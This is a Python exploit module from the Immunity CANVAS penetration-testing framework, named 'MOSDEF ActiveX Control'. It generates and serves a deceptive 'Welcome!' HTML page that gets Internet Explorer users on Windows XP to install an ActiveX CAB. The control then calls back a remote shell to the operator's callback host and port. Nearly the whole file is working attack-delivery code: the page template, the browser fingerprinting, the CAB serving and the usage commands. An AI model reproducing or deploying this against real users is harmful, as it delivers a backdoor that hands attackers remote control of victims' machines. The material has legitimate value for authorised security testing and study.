#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys

if "." not in sys.path: sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
from encoder import addencoder
from shellcode import shellcodeGenerator, win32shell # win32shell / linuxshell ???
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time

from httpclientside import httpclientside

#this module is not applicable for testomatic since it requires real user interaction

NAME="MOSDEF ActiveX Control"
DESCRIPTION="Serves an installable ActiveX control to the target host. The ActiveX calls back a shell."
DOCUMENTATION={}
DOCUMENTATION["VENDOR"]       = ""
DOCUMENTATION["Date public"]  = "03/10/2009"
DOCUMENTATION["CERT Advisory"]= ""
DOCUMENTATION["Repeatability"]= "Infinite"
DOCUMENTATION["References"]   = ""
DOCUMENTATION["CVE Name"]     = "N/A"
DOCUMENTATION["CVE Url"]      = "N/A"
DOCUMENTATION["Notes"]        = """
                                   This module is generally served from httpserver. Go to servers > httpserver and specify
                                   mosdef_activex as your module of choice. Users will then have to browse to your instance
                                   of httpserver to be exploited by this bug.

                                   Running this module directly will output an index.html file for you to serve manually
                                   from your webserver. You'll also need to copy Resources/CANVAS_AX.cab and
                                   Resources/CANVAS_AX.ocx to that server and adjust the path to them in index.html as
                                   required.

                                   This exploit will not work against IE 8 (the ActiveX will not even
                                   be asked for by default).

                                   This does not require a fromcreatethread listener."""
DOCUMENTATION["Tutorial"]     = "A free web tutorial on this module is available at: http://forum.immunityinc.com/index.php?topic=379.0"

VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY            = {}
PROPERTY['TYPE']    = "Exploit"
PROPERTY['SITE']    = "Client Side"
PROPERTY['ARCH']    = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP" ]
PROPERTY['MSADV']   = ''
PROPERTY['DELIVERY'] = 'HTTP'


NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:mosdef_activex -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""

"""


class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "MSIE", "")]
        self.canvashost      = "0.0.0.0"
        self.canvasport      = 5555
        self.httphost  = "0.0.0.0"
        self.httpport  = 80
        self.version   = 1
        self.badstring = "\x00\xff"
        self.name      = NAME
        self.filename  = "index.html"
        self.cab_file  = "CANVAS_AX.cab"
        self.js_file   = "loader.js"
        self.listenerArgsDict["fromcreatethread"] = 0

        return


    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        host = self.callback.ip
        port = self.callback.port
        return


    def run(self):

        self.host=self.target.interface
        self.filename=self.argsDict.get("filename",self.filename)

        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1

    def makefile(self, type = None):

        if type == None:
            filedata = """
            <HTML>
            <HEAD>
            <TITLE>Welcome!</TITLE>
            </HEAD>

            <BODY>

            <object ID='MOSDEF1' CLASSID="CLSID:5ABA8B30-EEEA-4C1E-B4C3-3E5EFE8A3D47" CODEBASE=http://HTTPHOST:HTTPPORT/CANVAS_AX.cab>
            </OBJECT>
            <script language='javascript'>
            MOSDEF1.CheckVersion("CALLBACKIP",CALLBACKPORT);
            </script>
            </BODY>
            </HTML>
            """


            try:
                if self.parent.bindip != "0.0.0.0":
                    filedata = filedata.replace("HTTPHOST",     self.parent.bindip )
                else:
                    filedata = filedata.replace("HTTPHOST",     self.callback.ip )

                filedata = filedata.replace("HTTPPORT",     str(self.parent.port) )

                filedata = filedata.replace("CALLBACKIP",   self.callback.ip )
                filedata = filedata.replace("CALLBACKPORT", str(self.callback.port) )
                self.log("Made ActiveX HTML File using %s:%d"%(self.callback.ip,self.callback.port))
            except:

                host     = self.argsDict.get('canvashost', self.canvashost )
                port     = self.argsDict.get('canvasport', self.canvasport )
                httphost = self.argsDict.get('httphost', self.httphost )
                httpport = self.argsDict.get('httpport', self.httpport )
                self.log("Making ActiveX HTML File using %s:%d"%(host,port))
                filedata = filedata.replace("CALLBACKIP", host )
                filedata = filedata.replace("CALLBACKPORT", str(port) )
                filedata = filedata.replace("HTTPHOST", httphost )
                filedata = filedata.replace("HTTPPORT", str(httpport) )


        return filedata


    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()

        if "MSIE 5." in clientheader.getHeaderValue("User-Agent"):
            self.log("MSIE 5. found. Serving blank header/body")
            return h,b

        if clientheader.URL.count( self.cab_file ):

            # The CAB file was requested.
            self.log("Redirecting to CAB file for installation.")
            h.addHeader("Content-Type","binary/octet-stream")

            cabfd = open( os.path.join(self.engine.config["canvas_resources"],self.cab_file), "rb" )
            cab = cabfd.read()
            cabfd.close()
            b.setBody( cab )
        else:
            # Serve up our HTML page that loads the ActiveX
            self.log("Serving HTML page to load ActiveX")
            sploitstring=self.makefile()
            self.log("File: %s"%sploitstring)
            b.setBody(sploitstring)


        return h,b



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)


